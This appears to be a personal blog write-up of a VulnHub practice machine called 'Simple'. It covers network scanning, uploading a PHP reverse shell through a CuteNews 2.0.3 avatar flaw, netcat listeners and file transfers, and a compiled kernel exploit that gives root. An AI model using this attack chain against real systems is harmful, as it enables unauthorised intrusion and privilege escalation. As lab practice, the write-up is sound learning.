@@ -1,0 +1,27 @@
+<p>I tried out another vulnerable machine. This one was called Simple. And can be found <a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/">here</a>.</p>
+<p>So I started out as usual by locating the machine.<br />
+[code]<br />
+ $ netdiscover -r 192.168.1.1/24<br />
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                   2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120<br />
+ _____________________________________________________________________________<br />
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname<br />
+ -----------------------------------------------------------------------------<br />
+ 192.168.1.1     e8:de:27:31:15:ee      1      60  TP-LINK TECHNOLOGIES CO.,LTD.<br />
+ 192.168.1.103   08:00:27:60:21:5c      1      60  Cadmus Computer Systems<br />
+[/code]</p>
+<p>[code]<br />
+nmap -A -O -T4 -p- -vv 192.168.1.102 </p>
+<p>[/code]</p>
+<p>Only port 80 open. Si I browser over there.<br />
+I was met by an the interface of some kind of new-service called CuteNews. It had the version written on the first page. CuteNews v.2.0.3. And what I had learned from the last VM I did was that it is always a good idea to search for exploits (duh). So before going a head with dirbuster/zap/nikto/whatevs I just searched fore CuteNews in exploit-db. And that was a great idea.<br />
+So I just checked out the very first that came up, and it looked easy. It was <a href="https://www.exploit-db.com/exploits/37474/">this one</a>. So I went ahead and created and account, renamed my php-reverse-shell.php to shell.jpg. Then I intercepted it with burp-suite and changed the name back to php.<br />
+And then I just started nc with nv -lvp 4444. And after visiting: cutenews.dev/uploads/avatar_username_shell.php I was rewarded with a shell.<br />
+I sent over my enumeration-script that I am working on with netcat.</p>
+<p>[code][/code]<br />
+nc -lvp 3333 &gt; enum.sh<br />
+nc 192.168.1.103 &lt; enum.sh<br />
+[code][/code]</p>
+<p>I soon found out that it has the same privesc-vulnerability as the machine I was working on the other day. So I already had the exploit ready to go. It was <a href="https://www.exploit-db.com/exploits/37292/">this one</a>. I sent it over with netcat and then compiled it with gcc, then chmod +x. And then I was root, and got the flag in the /root folder.<br />
+https://www.exploit-db.com/exploits/37474/</p>
+<h2>Conclusion</h2>
+<p>I felt like all the hard work before really payed off on this one. I knew the exploits, I knew how to transfer files easily. This was a great little project.</p>
